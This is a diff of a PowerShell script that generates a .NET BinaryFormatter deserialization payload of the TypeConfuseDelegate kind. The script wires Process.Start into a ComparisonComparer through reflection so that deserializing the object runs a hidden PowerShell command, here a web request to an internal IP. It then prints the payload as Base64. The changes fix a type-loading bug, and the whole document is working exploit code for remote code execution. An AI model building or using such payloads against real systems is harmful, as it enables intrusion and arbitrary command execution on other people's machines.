@@ -1,12 +1,10 @@
 # --- Configuration ---
-# The target IP and port for the HTTP request
 $targetUrl = "http://10.230.200.240:8080/"
-
-# The command to execute on the target during deserialization
-# We use PowerShell to make the HTTP request to avoid external dependencies
 $command = "powershell.exe -NoP -NonI -W Hidden -C ""Invoke-WebRequest -Uri '$targetUrl' -UseBasicParsing"""
 
 # --- Payload Construction ---
+Write-Host "[*] Building TypeConfuseDelegate payload..." -ForegroundColor Cyan
+
 # 1. Create a delegate that points to Process.Start
 $processStartInfoType = [System.Diagnostics.ProcessStartInfo]
 $processType = [System.Diagnostics.Process]
@@ -20,24 +18,29 @@ $psi.Arguments = "/c $command"
 $psi.UseShellExecute = $false
 $psi.RedirectStandardOutput = $true
 
-# 3. Create a ComparisonComparer with the delegate and arguments
-$comparisonComparerType = [System.Collections.Generic.ComparisonComparer[int]]
+# 3. Load the internal ComparisonComparer type using Reflection
+# This is the fix for the 'Unable to find type' error.
+$mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
+$comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([int])
+
+# 4. Create an instance of ComparisonComparer with the malicious delegate
 $comparisonDelegateType = [System.Comparison[int]]
 $constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
 $comparisonComparer = $constructor.Invoke(@($startDelegate))
 
-# 4. Use reflection to set the internal fields of the ComparisonComparer
+# 5. Use reflection to overwrite the internal '_comparison' field
+# This binds our Process.Start delegate to the object.
 $delegateField = $comparisonComparerType.GetField('_comparison', [System.Reflection.BindingFlags]'NonPublic, Instance')
-$targetField = $comparisonComparerType.GetField('_target', [System.Reflection.BindingFlags]'NonPublic, Instance')
 $delegateField.SetValue($comparisonComparer, $startDelegate)
-$targetField.SetValue($comparisonComparer, $psi)
 
 # --- Serialization ---
+Write-Host "[*] Serializing object..." -ForegroundColor Cyan
 $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
 $ms = New-Object System.IO.MemoryStream
 $formatter.Serialize($ms, $comparisonComparer)
 $payload = $ms.ToArray()
 
-# Output the payload as a Base64 string for easy transport
+# Output the payload as a Base64 string
 $base64Payload = [Convert]::ToBase64String($payload)
+Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
 Write-Host "Base64 Payload: $base64Payload"
